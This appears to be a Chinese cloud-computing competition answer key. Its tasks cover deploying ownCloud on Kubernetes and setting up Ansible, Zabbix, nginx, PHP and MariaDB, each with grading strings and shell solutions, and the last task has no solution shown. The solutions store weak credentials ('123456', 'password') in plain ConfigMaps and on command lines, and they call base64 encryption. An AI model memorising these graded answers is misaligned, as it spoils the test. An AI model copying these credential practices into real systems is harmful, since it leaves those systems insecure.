<h3 id="1-创建PV和PVC"><a href="#1-创建PV和PVC" class="headerlink" title="1.创建PV和PVC"></a>1.创建PV和PVC</h3><p> 编写yaml文件(文件名自定义)创建PV和PVC来提供持久化存储，以便保存 ownCloud 服务中的文件和数据。</p>
<p>要求：PV（访问模式为读写，只能被单个节点挂载;存储为5Gi;存储类型为hostPath,存储路径自定义）</p>
<p>   PVC（访问模式为读写，只能被单个节点挂载;申请存储空间大小为5Gi）</p>
<p>​    将kubectl get pv,pvc命令的返回结果提交到答题框。【2分】</p>
<p><strong>标准: persistentvolume&#x2F;owncloud-pv&amp;&amp;RWO&amp;&amp;persistentvolumeclaim&#x2F;owncloud-pvc&amp;&amp;Bound</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="built_in">cat</span> owncloud-pvc.yaml</span></span><br><span class="line">apiVersion: v1</span><br><span class="line">kind: PersistentVolume</span><br><span class="line">metadata:</span><br><span class="line">  name: owncloud-pv</span><br><span class="line">spec:</span><br><span class="line">  accessModes:</span><br><span class="line">    - ReadWriteOnce</span><br><span class="line">  capacity:</span><br><span class="line">    storage: 5Gi</span><br><span class="line">  hostPath:</span><br><span class="line">    path: /data/owncloud</span><br><span class="line">---</span><br><span class="line">apiVersion: v1</span><br><span class="line">kind: PersistentVolumeClaim</span><br><span class="line">metadata:</span><br><span class="line">  name: owncloud-pvc</span><br><span class="line">spec:</span><br><span class="line">  accessModes:</span><br><span class="line">    - ReadWriteOnce</span><br><span class="line">  resources:</span><br><span class="line">    requests:</span><br><span class="line">      storage: 5Gi</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">kubectl apply -f /opt/owncloud-pvc.yaml</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">kubectl get pv,pvc</span></span><br><span class="line">NAME                           CAPACITY   ACCESS MODES   RECLAIM POLICY   STATUS   CLAIM                  STORAGECLASS   REASON   AGE</span><br><span class="line">persistentvolume/owncloud-pv   5Gi        RWO            Retain           Bound    default/owncloud-pvc                           2m41s</span><br><span class="line">NAME                                 STATUS   VOLUME        CAPACITY   ACCESS MODES   STORAGECLASS   AGE</span><br><span class="line">persistentvolumeclaim/owncloud-pvc   Bound    owncloud-pv   5Gi        RWO                           2m41s</span><br></pre></td></tr></table></figure>

<h3 id="2-配置ConfigMap"><a href="#2-配置ConfigMap" class="headerlink" title="2. 配置ConfigMap"></a>2. 配置ConfigMap</h3><p> 编写yaml文件(文件名自定义)创建一个configMap对象，指定OwnCloud的环境变量。登录账号对应的环境变量为OWNCLOUD_ADMIN_USERNAME,密码对应的环境变量为OWNCLOUD_ADMIN_PASSWORD。（变量值自定义）</p>
<p>  将kubectl get ConfigMap命令的返回结果提交到答题框。【2分】</p>
<p><strong>标准: kube-root-ca.crt&amp;&amp;1&amp;&amp;2</strong></p>
<p>解法:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="built_in">cat</span> owncloud-configmap.yaml</span></span><br><span class="line">apiVersion: v1</span><br><span class="line">kind: ConfigMap</span><br><span class="line">metadata:</span><br><span class="line">  name: owncloud-config</span><br><span class="line">data:</span><br><span class="line">  OWNCLOUD_ADMIN_USERNAME: “admin”</span><br><span class="line">  OWNCLOUD_ADMIN_PASSWORD: “123456”</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">kubectl apply -f  owncloud-configmap.yaml</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">kubectl get ConfigMap</span></span><br><span class="line">NAME               DATA   AGE</span><br><span class="line">kube-root-ca.crt   1      20h</span><br><span class="line">owncloud-config    2      2m11s</span><br></pre></td></tr></table></figure>

<h3 id="3-创建Secret"><a href="#3-创建Secret" class="headerlink" title="3.创建Secret"></a>3.创建Secret</h3><p>编写yaml文件(文件名自定义)创建一个Secret对象，以保存OwnCloud数据库的密码。对原始密码采用base64编码格式进行加密。</p>
<p> 将kubectl get Secret命令的返回结果提交到答题框。【2分】</p>
<p><strong>标准:Opaque&amp;&amp;1</strong></p>
<p>解法:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="built_in">echo</span> 123456 | <span class="built_in">base64</span></span></span><br><span class="line">MTIzNDU2Cg==</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="built_in">cat</span> owncloud-secret.yaml</span></span><br><span class="line">apiVersion: v1</span><br><span class="line">kind: Secret</span><br><span class="line">metadata:</span><br><span class="line">  name: owncloud-db-password</span><br><span class="line">type: Opaque</span><br><span class="line">data:</span><br><span class="line">  password: MTIzNDU2Cg==</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">kubectl apply -f /opt/owncloud-secret.yaml</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">kubectl get Secret</span></span><br><span class="line">NAME                   TYPE     DATA   AGE</span><br><span class="line">owncloud-db-password   Opaque   1      46s</span><br></pre></td></tr></table></figure>

<h3 id="4-部署owncloud-Deployment应用"><a href="#4-部署owncloud-Deployment应用" class="headerlink" title="4.部署owncloud Deployment应用"></a>4.部署owncloud Deployment应用</h3><p>编写yaml文件(文件名自定义) 创建Deployment对象, 指定OwnCloud的容器和相关的环境变量。(Deployment资源命名为owncloud-deployment,镜像为Harbor仓库中的owncloud:latest，存储的挂载路径为&#x2F;var&#x2F;www&#x2F;html,其它根据具体情况进行配置)</p>
<p>将kubectl describe pod命令的返回结果提交到答题框。【2分】</p>
<p><strong>标准: ReplicaSet&#x2F;owncloud-deployment&amp;&amp;owncloud@sha256&amp;&amp;kube-root-ca.crt&amp;&amp;Successfully&amp;&amp;Started</strong></p>
<p>解法:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="built_in">cat</span> owncloud-deploy.yaml</span></span><br><span class="line">apiVersion: apps/v1</span><br><span class="line">kind: Deployment</span><br><span class="line">metadata:</span><br><span class="line">  name: owncloud-deployment</span><br><span class="line">spec:</span><br><span class="line">  replicas: 1</span><br><span class="line">  selector:</span><br><span class="line">    matchLabels:</span><br><span class="line">      app: owncloud</span><br><span class="line">  template:</span><br><span class="line">    metadata:</span><br><span class="line">      labels:</span><br><span class="line">        app: owncloud</span><br><span class="line">    spec:</span><br><span class="line">      containers:</span><br><span class="line">      - name: owncloud</span><br><span class="line">        image: 192.168.100.91/library/owncloud:latest</span><br><span class="line">        imagePullPolicy: IfNotPresent</span><br><span class="line">        envFrom:</span><br><span class="line">        - configMapRef:</span><br><span class="line">            name: owncloud-config</span><br><span class="line">        env:</span><br><span class="line">        - name: OWNCLOUD_DB_PASSWORD</span><br><span class="line">          valueFrom:</span><br><span class="line">            secretKeyRef:</span><br><span class="line">              name: owncloud-db-password</span><br><span class="line">              key: password</span><br><span class="line">        ports:</span><br><span class="line">        - containerPort: 80</span><br><span class="line">        volumeMounts:</span><br><span class="line">        - name: owncloud-pv</span><br><span class="line">          mountPath: /var/www/html</span><br><span class="line">      volumes:</span><br><span class="line">      - name: owncloud-pv</span><br><span class="line">        persistentVolumeClaim:</span><br><span class="line">          claimName: owncloud-pvc</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">kubectl apply -f /opt/owncloud-deploy.yaml</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">kubectl describe pod</span></span><br><span class="line">Name:             owncloud-deployment-845c85cfcb-6ptqr</span><br><span class="line">Namespace:        default</span><br><span class="line">Priority:         0</span><br><span class="line">Service Account:  default</span><br><span class="line">Node:             node/192.168.100.23</span><br><span class="line">Start Time:       Fri, 17 Mar 2023 02:56:31 +0000</span><br><span class="line">Labels:           app=owncloud</span><br><span class="line">                  pod-template-hash=845c85cfcb</span><br><span class="line">Annotations:      &lt;none&gt;</span><br><span class="line">Status:           Running</span><br><span class="line">IP:               10.244.1.3</span><br><span class="line">IPs:</span><br><span class="line">  IP:           10.244.1.3</span><br><span class="line">Controlled By:  ReplicaSet/owncloud-deployment-845c85cfcb</span><br><span class="line">Containers:</span><br><span class="line">  owncloud:</span><br><span class="line">    Container ID:   containerd://d60dc4426c06cef6525e4e37f0ee37dcef762c2806c19efcd666f951d66a5c84</span><br><span class="line">    Image:          192.168.100.91/library/owncloud:latest</span><br><span class="line">    Image ID:       192.168.100.91/library/owncloud@sha256:5c77bfdf8cfaf99ec94309be2687032629f4f985d6bd388354dfd85475aa5f21</span><br><span class="line">    Port:           80/TCP</span><br><span class="line">    Host Port:      0/TCP</span><br><span class="line">    State:          Running</span><br><span class="line">      Started:      Fri, 17 Mar 2023 02:56:39 +0000</span><br><span class="line">    Ready:          True</span><br><span class="line">    Restart Count:  0</span><br><span class="line">    Environment Variables from:</span><br><span class="line">      owncloud-config  ConfigMap  Optional: false</span><br><span class="line">    Environment:</span><br><span class="line">      OWNCLOUD_DB_PASSWORD:  &lt;set to the key &#x27;password&#x27; in secret &#x27;owncloud-db-password&#x27;&gt;  Optional: false</span><br><span class="line">    Mounts:</span><br><span class="line">      /var/run/secrets/kubernetes.io/serviceaccount from kube-api-access-vtpd9 (ro)</span><br><span class="line">      /var/www/html from owncloud-pv (rw)</span><br><span class="line">Conditions:</span><br><span class="line">  Type              Status</span><br><span class="line">  Initialized       True</span><br><span class="line">  Ready             True</span><br><span class="line">  ContainersReady   True</span><br><span class="line">  PodScheduled      True</span><br><span class="line">Volumes:</span><br><span class="line">  owncloud-pv:</span><br><span class="line">    Type:       PersistentVolumeClaim (a reference to a PersistentVolumeClaim in the same namespace)</span><br><span class="line">    ClaimName:  owncloud-pvc</span><br><span class="line">    ReadOnly:   false</span><br><span class="line">  kube-api-access-vtpd9:</span><br><span class="line">    Type:                    Projected (a volume that contains injected data from multiple sources)</span><br><span class="line">    TokenExpirationSeconds:  3607</span><br><span class="line">    ConfigMapName:           kube-root-ca.crt</span><br><span class="line">    ConfigMapOptional:       &lt;nil&gt;</span><br><span class="line">    DownwardAPI:             true</span><br><span class="line">QoS Class:                   BestEffort</span><br><span class="line">Node-Selectors:              &lt;none&gt;</span><br><span class="line">Tolerations:                 node.kubernetes.io/not-ready:NoExecute op=Exists for 300s</span><br><span class="line">                             node.kubernetes.io/unreachable:NoExecute op=Exists for 300s</span><br><span class="line">Events:</span><br><span class="line">  Type    Reason     Age   From               Message</span><br><span class="line">  ----    ------     ----  ----               -------</span><br><span class="line">  Normal  Scheduled  14m   default-scheduler  Successfully assigned default/owncloud-deployment-845c85cfcb-6ptqr to node</span><br><span class="line">  Normal  Pulling    14m   kubelet            Pulling image &quot;192.168.100.91/library/owncloud:latest&quot;</span><br><span class="line">  Normal  Pulled     14m   kubelet            Successfully pulled image &quot;192.168.100.91/library/owncloud:latest&quot; in 7.266482912s</span><br><span class="line">  Normal  Created    14m   kubelet            Created container owncloud</span><br><span class="line">  Normal  Started    14m   kubelet            Started container owncloud</span><br></pre></td></tr></table></figure>

<h3 id="5-创建Service"><a href="#5-创建Service" class="headerlink" title="5.创建Service"></a>5.创建Service</h3><p>编写yaml文件(文件名自定义)创建一个Service对象将OwnCloud公开到集群外部。通过<a href="http://ip/">http://IP</a>:端口号可查看owncloud。</p>
<p>  将kubectl get svc -A命令的返回结果提交到答题框。【2分】</p>
<p><strong>标准: ClusterIP&amp;&amp;NodePort&amp;&amp;443&amp;&amp;53&amp;&amp;9153&amp;&amp;8000&amp;&amp;80:</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="built_in">cat</span> owncloud-svc.yaml</span></span><br><span class="line">apiVersion: v1</span><br><span class="line">kind: Service</span><br><span class="line">metadata:</span><br><span class="line">  name: owncloud-service</span><br><span class="line">spec:</span><br><span class="line">  selector:</span><br><span class="line">    app: owncloud</span><br><span class="line">  ports:</span><br><span class="line">    - name: http</span><br><span class="line">      port: 80</span><br><span class="line">  type: NodePort</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">kubectl apply -f /opt/owncloud-svc.yaml</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">kubectl get svc -A</span></span><br><span class="line">NAMESPACE              NAME                        TYPE        CLUSTER-IP       EXTERNAL-IP   PORT(S)                  AGE</span><br><span class="line">default                kubernetes                  ClusterIP   10.96.0.1        &lt;none&gt;        443/TCP                  24h</span><br><span class="line">default                owncloud-service            NodePort    10.98.228.242    &lt;none&gt;        80:31024/TCP             17m</span><br><span class="line">kube-system            kube-dns                    ClusterIP   10.96.0.10       &lt;none&gt;        53/UDP,53/TCP,9153/TCP   24h</span><br><span class="line">kubernetes-dashboard   dashboard-metrics-scraper   ClusterIP   10.105.211.63    &lt;none&gt;        8000/TCP                 22h</span><br><span class="line">kubernetes-dashboard   kubernetes-dashboard        NodePort    10.104.143.162   &lt;none&gt;        443:30001/TCP            22h</span><br></pre></td></tr></table></figure>

<h1 id="C模块题目：企业级应用的自动化部署和运维"><a href="#C模块题目：企业级应用的自动化部署和运维" class="headerlink" title="C模块题目：企业级应用的自动化部署和运维"></a>C模块题目：企业级应用的自动化部署和运维</h1><p><em><strong>*虚拟机与环境规划*</strong></em></p>
<p>表3</p>
<table>
<thead>
<tr>
<th>设备名称</th>
<th>主机名</th>
<th>接口</th>
<th>IP地址</th>
<th>角色</th>
</tr>
</thead>
<tbody><tr>
<td>云服务器1</td>
<td>zabbix_server</td>
<td>eth0</td>
<td>公网IP:*******<em>私网IP:192.168.100.</em>&#x2F;24</td>
<td>ansible,zabbix_server</td>
</tr>
<tr>
<td>云服务器2</td>
<td>zabbix_agent</td>
<td>eth0</td>
<td>公网IP:*******<em>私网IP:192.168.100.</em>&#x2F;24</td>
<td>zabbix_agent</td>
</tr>
</tbody></table>
<p>\1. 上表中的公网IP以自己云主机显示为准，每个人的公网IP不同。使用第三方软件远程连接云主机，使用公网IP连接。</p>
<p>2.华为云中云主机名字已命好，直接使用对应名字的云主机即可。</p>
<p>3.竞赛用到的软件包都在云主机&#x2F;root下。</p>
<h2 id="企业级应用的自动化部署（30分）"><a href="#企业级应用的自动化部署（30分）" class="headerlink" title="企业级应用的自动化部署（30分）"></a>企业级应用的自动化部署（30分）</h2><p> 部署方式：监控主机zabbix_server节点采用手动部署，被监控主机zabbix_agent采用Playbook部署。</p>
<h3 id="1-安装ansible"><a href="#1-安装ansible" class="headerlink" title="1.安装ansible"></a>1.安装ansible</h3><p>修改主机名zabbix_server节点主机名为zabbix_server,zabbix_agent节点主机名为Zabbix_agent,使用提供的软件包&#x2F;root&#x2F;autoDeployment.tar在zabbix_server节点安装ansible。</p>
<p>将ansible –version 命令的返回结果提交到答题框。【2分】</p>
<p><strong>标准:2.9.27&amp;&amp;2.7.5</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@master ~]# hostnamectl set-hostname zabbix_server</span><br><span class="line">[root@master ~]# bash</span><br><span class="line">[root@node ~]# hostnamectl set-hostname zabbix_agent</span><br><span class="line">[root@node ~]# bash</span><br><span class="line">[root@zabbix_server ~]# mv autoDeployment.tar  /opt/</span><br><span class="line">[root@zabbix_server ~]# cd /opt/</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">tar  -xvf autoDeployment.tar</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">mount CentOS-7-x86_64-DVD-2009.iso /mnt/</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="built_in">rm</span> -rf /etc/yum.repos.d/*</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">vi /etc/yum.repos.d/local.repo</span></span><br><span class="line">[auto]</span><br><span class="line">name=auto</span><br><span class="line">baseurl=file:///opt/autoDeployment</span><br><span class="line">enabled=1</span><br><span class="line">gpgcheck=0</span><br><span class="line">[centos]</span><br><span class="line">name=centos</span><br><span class="line">baseurl=file:///mnt/</span><br><span class="line">enabled=1</span><br><span class="line">gpgcheck=0</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">yum -y install ansible</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">ansible --version</span></span><br><span class="line">ansible 2.9.27</span><br><span class="line">  config file = /etc/ansible/ansible.cfg</span><br><span class="line">  configured module search path = [u&#x27;/root/.ansible/plugins/modules&#x27;, u&#x27;/usr/share/ansible/plugins/modules&#x27;]</span><br><span class="line">  ansible python module location = /usr/lib/python2.7/site-packages/ansible</span><br><span class="line">  executable location = /usr/bin/ansible</span><br><span class="line">  python version = 2.7.5 (default, Oct 14 2020, 14:45:30) [GCC 4.8.5 20150623 (Red Hat 4.8.5-44)]</span><br></pre></td></tr></table></figure>

<h3 id="2-配置免密登录"><a href="#2-配置免密登录" class="headerlink" title="2.配置免密登录"></a>2.配置免密登录</h3><p>在zabbix_server节点配置hosts文件，并将该文件远程发送给zabbix_agent节点，并配置免密登录。</p>
<p>在zabbix_server节点将ssh zabbix_agent命令的返回结果提交到答题框。【2分】</p>
<p><strong>标准: login&amp;&amp;Welcome</strong></p>
<p>解法:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="built_in">cat</span> /etc/hosts</span></span><br><span class="line">127.0.0.1   localhost localhost.localdomain localhost4 localhost4.localdomain4</span><br><span class="line">::1         localhost localhost.localdomain localhost6 localhost6.localdomain6</span><br><span class="line">192.168.100.91 zabbix_server</span><br><span class="line">192.168.100.23 zabbix_agent</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">scp /etc/hosts 192.168.100.23:/etc/</span></span><br><span class="line">[root@ansible Zabbix_server ~]# ssh-keygen</span><br><span class="line">[root@ansible Zabbix_server ~]# ssh-copy-id Zabbix_agent</span><br><span class="line">[root@ zabbix_server ~]# ssh zabbix_agent</span><br><span class="line">Last failed login: Fri Mar 17 12:56:03 UTC 2023 from 58.33.154.106 on ssh:notty</span><br><span class="line">There were 20 failed login attempts since the last successful login.</span><br><span class="line">Last login: Fri Mar 17 11:58:03 2023 from 121.229.222.70</span><br><span class="line"></span><br><span class="line">  ******************************</span><br><span class="line">  *  Welcome to GuoJiBeiSheng  *</span><br><span class="line">  ******************************</span><br><span class="line"></span><br><span class="line">[root@ zabbix_agent ~]# exit</span><br></pre></td></tr></table></figure>

<h3 id="3-配置主机清单"><a href="#3-配置主机清单" class="headerlink" title="3.配置主机清单"></a>3.配置主机清单</h3><p>在Zabbix_server节点配置ansible主机清单，在清单中创建agent主机组。</p>
<p> 将ansible agent –m ping命令的返回结果提交到答题框。【2分】</p>
<p><strong>标准: zabbix_agent&amp;&amp;SUCCESS&amp;&amp;pong</strong></p>
<p>解法:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="built_in">tail</span> -2 /etc/ansible/hosts</span></span><br><span class="line">[agent]</span><br><span class="line">zabbix_agent</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">ansible agent -m ping</span></span><br><span class="line">zabbix_agent | SUCCESS =&gt; &#123;</span><br><span class="line">    &quot;ansible_facts&quot;: &#123;</span><br><span class="line">        &quot;discovered_interpreter_python&quot;: &quot;/usr/bin/python&quot;</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;changed&quot;: false,</span><br><span class="line">    &quot;ping&quot;: &quot;pong&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="4-安装nginx和php"><a href="#4-安装nginx和php" class="headerlink" title="4.安装nginx和php"></a>4.安装nginx和php</h3><p>配置基础环境，安装nginx和php74（根据实际需要安装相关php74扩展包），并开启相关服务。</p>
<p>将nginx -v &amp;&amp; php74 –v命令的返回结果提交到答题框。【2分】</p>
<p><strong>标准: nginx&#x2F;1.22.1&amp;&amp;7.4.33&amp;&amp;v3.4.0</strong></p>
<p>解法:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@zabbix_server opt]# yum -y install nginx</span><br><span class="line">[root@zabbix_server ~]# systemctl start nginx</span><br><span class="line">[root@zabbix_server ~]# yum -y install php74-php-fpm php74-php-common php74-php-cli php74-php-gd php74-php-ldap php74-php-mbstring php74-php-mysqlnd php74-php-xml php74-php-bcmath php74-php</span><br><span class="line">[root@zabbix_server ~]#systemctl start php74-php-fpm</span><br><span class="line">[root@zabbix_server ~]#  nginx -v &amp;&amp; php74 -v</span><br><span class="line">nginx version: nginx/1.22.1</span><br><span class="line">PHP 7.4.33 (cli) (built: Feb 14 2023 08:49:52) ( NTS )</span><br><span class="line">Copyright (c) The PHP Group</span><br><span class="line">Zend Engine v3.4.0, Copyright (c) Zend Technologies</span><br></pre></td></tr></table></figure>

<h3 id="5-安装zabbix服务器端和客户端"><a href="#5-安装zabbix服务器端和客户端" class="headerlink" title="5.安装zabbix服务器端和客户端"></a>5.安装zabbix服务器端和客户端</h3><p>在zabbix_server节点安装zabbix服务器、代理和web前端，安装前注意查看rpm包的名字,并分别启动zabbix-server和zabbix-agent。</p>
<p>  将systemctl status zabbix-server&amp;&amp; systemctl status zabbix-agent命令的返回结果提交到答题框。【2分】</p>
<p><strong>标准: zabbix-server-mysql.service&amp;&amp;zabbix-agent.service&amp;&amp;active (running)&amp;&amp;SUCCESS</strong></p>
<p>解法:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">yum -y install zabbix6.0-server  zabbix6.0-web-mysql zabbix-agent</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">systemctl start zabbix-server&amp;&amp; systemctl start zabbix-agent</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">systemctl status zabbix-server&amp;&amp; systemctl status zabbix-agent</span></span><br><span class="line">● zabbix-server-mysql.service - Zabbix Server with MySQL DB</span><br><span class="line">   Loaded: loaded (/usr/lib/systemd/system/zabbix-server-mysql.service; disabled; vendor preset: disabled)</span><br><span class="line">   Active: active (running) since Sat 2023-03-18 04:36:50 UTC; 4min 5s ago</span><br><span class="line"> Main PID: 20737 (zabbix_server)</span><br><span class="line">   CGroup: /system.slice/zabbix-server-mysql.service</span><br><span class="line">           └─20737 /usr/sbin/zabbix_server -f</span><br><span class="line"></span><br><span class="line">Mar 18 04:36:50 zabbix_server systemd[1]: Started Zabbix Serve...</span><br><span class="line">Hint: Some lines were ellipsized, use -l to show in full.</span><br><span class="line">● zabbix-agent.service - Zabbix Agent</span><br><span class="line">   Loaded: loaded (/usr/lib/systemd/system/zabbix-agent.service; disabled; vendor preset: disabled)</span><br><span class="line">   Active: active (running) since Sat 2023-03-18 04:37:47 UTC; 3min 8s ago</span><br><span class="line">  Process: 20752 ExecStart=/usr/sbin/zabbix_agentd -c $CONFFILE (code=exited, status=0/SUCCESS)</span><br><span class="line">  Main PID: 20754 (zabbix_agentd)</span><br><span class="line">   CGroup: /system.slice/zabbix-agent.service</span><br><span class="line">           ├─20754 /usr/sbin/zabbix_agentd -c /etc/zabbix/zabb...</span><br><span class="line">           ├─20755 /usr/sbin/zabbix_agentd: collector [idle 1 ...</span><br><span class="line">           ├─20756 /usr/sbin/zabbix_agentd: listener #1 [waiti...</span><br><span class="line">           ├─20757 /usr/sbin/zabbix_agentd: listener #2 [waiti...</span><br><span class="line">           ├─20758 /usr/sbin/zabbix_agentd: listener #3 [waiti...</span><br><span class="line">           └─20759 /usr/sbin/zabbix_agentd: active checks #1 [...</span><br><span class="line"></span><br><span class="line">Mar 18 04:37:47 zabbix_server systemd[1]: Starting Zabbix Agen...</span><br><span class="line">Mar 18 04:37:47 zabbix_server systemd[1]: Started Zabbix Agent.</span><br><span class="line">Hint: Some lines were ellipsized, use -l to show in full.</span><br></pre></td></tr></table></figure>

<h3 id="6-安装数据库"><a href="#6-安装数据库" class="headerlink" title="6.安装数据库"></a>6.安装数据库</h3><p>安装数据库MariaDB，启动数据库并设置为开机自启动。</p>
<p>将systemctl status mariadb命令的返回结果提交到答题框。【2分】</p>
<p><strong>标准:mariadb.service&amp;&amp;active&amp;&amp;(running)&amp;&amp;SUCCESS&amp;&amp;mariadb-wait-ready</strong></p>
<p>解法:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">yum -y install mariadb-server</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">systemctl start mariadb</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">systemctl status mariadb</span></span><br><span class="line">● mariadb.service - MariaDB database server</span><br><span class="line">   Loaded: loaded (/usr/lib/systemd/system/mariadb.service; disabled; vendor preset: disabled)</span><br><span class="line">   Active: active (running) since Sat 2023-03-18 04:52:20 UTC; 1min 2s ago</span><br><span class="line">  Process: 20907 ExecStartPost=/usr/libexec/mariadb-wait-ready $MAINPID (code=exited, status=0/SUCCESS)</span><br><span class="line">  Process: 20822 ExecStartPre=/usr/libexec/mariadb-prepare-db-dir %n (code=exited, status=0/SUCCESS)</span><br><span class="line"> Main PID: 20905 (mysqld_safe)</span><br><span class="line">   CGroup: /system.slice/mariadb.service</span><br><span class="line">           ├─20905 /bin/sh /usr/bin/mysqld_safe --basedir=/usr...</span><br><span class="line">           └─21071 /usr/libexec/mysqld --basedir=/usr --datadi...</span><br><span class="line"></span><br><span class="line">Mar 18 04:52:18 zabbix_server mariadb-prepare-db-dir[20822]: M...</span><br><span class="line">Mar 18 04:52:18 zabbix_server mariadb-prepare-db-dir[20822]: P...</span><br><span class="line">Mar 18 04:52:18 zabbix_server mariadb-prepare-db-dir[20822]: T...</span><br><span class="line">Mar 18 04:52:18 zabbix_server mariadb-prepare-db-dir[20822]: Y...</span><br><span class="line">Mar 18 04:52:18 zabbix_server mariadb-prepare-db-dir[20822]: h...</span><br><span class="line">Mar 18 04:52:18 zabbix_server mariadb-prepare-db-dir[20822]: C...</span><br><span class="line">Mar 18 04:52:18 zabbix_server mariadb-prepare-db-dir[20822]: h...</span><br><span class="line">Mar 18 04:52:18 zabbix_server mysqld_safe[20905]: 230318 04:52...</span><br><span class="line">Mar 18 04:52:18 zabbix_server mysqld_safe[20905]: 230318 04:52...</span><br><span class="line">Mar 18 04:52:20 zabbix_server systemd[1]: Started MariaDB data...</span><br><span class="line">Hint: Some lines were ellipsized, use -l to show in full.</span><br></pre></td></tr></table></figure>

<h3 id="7-配置数据库"><a href="#7-配置数据库" class="headerlink" title="7.配置数据库"></a>7.配置数据库</h3><p>登录mysql,创建数据库zabbix和用户zabbix密码自定义，并授权zabbix用户拥有zabbix数据库的所有权限。</p>
<p>  将show grants for ‘zabbix‘@’localhost’;命令的返回结果提交到答题框。【2分】</p>
<p><strong>标准: ALL&amp;&amp;PRIVILEGES</strong></p>
<p>解法:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">mysql -uroot -p</span></span><br><span class="line">MariaDB [(none)]&gt; create database zabbix character set utf8mb4 collate utf8mb4_general_ci;</span><br><span class="line">MariaDB [(none)]&gt; grant all privileges on zabbix.* to zabbix@localhost identified by &#x27;password&#x27;;</span><br><span class="line">MariaDB [zabbix]&gt; show grants for &#x27;zabbix&#x27;@&#x27;localhost&#x27;;</span><br><span class="line">+---------------------------------------------------------------------------------------------------------------+</span><br><span class="line">| Grants for zabbix@localhost                                                                                   |</span><br><span class="line">+---------------------------------------------------------------------------------------------------------------+</span><br><span class="line">| GRANT USAGE ON *.* TO &#x27;zabbix&#x27;@&#x27;localhost&#x27; IDENTIFIED BY PASSWORD &#x27;*2470C0C06DEE42FD1618BB99005ADCA2EC9D1E19&#x27; |</span><br><span class="line">| GRANT ALL PRIVILEGES ON `zabbix`.* TO &#x27;zabbix&#x27;@&#x27;localhost&#x27;</span><br></pre></td></tr></table></figure>

<h3 id="8-导入数据库架构"><a href="#8-导入数据库架构" class="headerlink" title="8.导入数据库架构"></a>8.导入数据库架构</h3><p>分别导入数据库架构及数据，对应的文件分别为schema.sql、images.sql和data.sql（文件顺便不能乱）。</p>
<p>  登录数据库将select username from users;命令的返回结果提交到答题框（用zabbix数据库）。【2分】</p>
<p><strong>标准:Admin&amp;&amp;guest</strong></p>
<p>解法:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@zabbix_server ~]# mysql -uroot -ppassword zabbix &lt; /usr/share/zabbix-mysql/schema.sql</span><br><span class="line">[root@zabbix_server ~]# mysql -uroot -ppassword zabbix &lt; /usr/share/zabbix-mysql/images.sql</span><br><span class="line">[root@zabbix_server ~]# mysql -uroot -ppassword zabbix &lt; /usr/share/zabbix-mysql/data.sql</span><br><span class="line">[root@zabbix_server ~]# mysql -uzabbix -p</span><br><span class="line">Enter password:</span><br><span class="line">MariaDB [(none)]&gt; use zabbix;</span><br><span class="line">MariaDB [zabbix]&gt; select username from users;</span><br><span class="line">+----------+</span><br><span class="line">| username |</span><br><span class="line">+----------+</span><br><span class="line">| Admin    |</span><br><span class="line">| guest    |</span><br></pre></td></tr></table></figure>

<h3 id="9-配置文件"><a href="#9-配置文件" class="headerlink" title="9.配置文件"></a>9.配置文件</h3><p>配置default.conf。</p>
<p>   将cat &#x2F;etc&#x2F;nginx&#x2F;conf.d&#x2F;default.conf命令的返回结果提交到答题框。【2分】</p>
<p><strong>标准: index.php</strong></p>
<p>解法:</p>
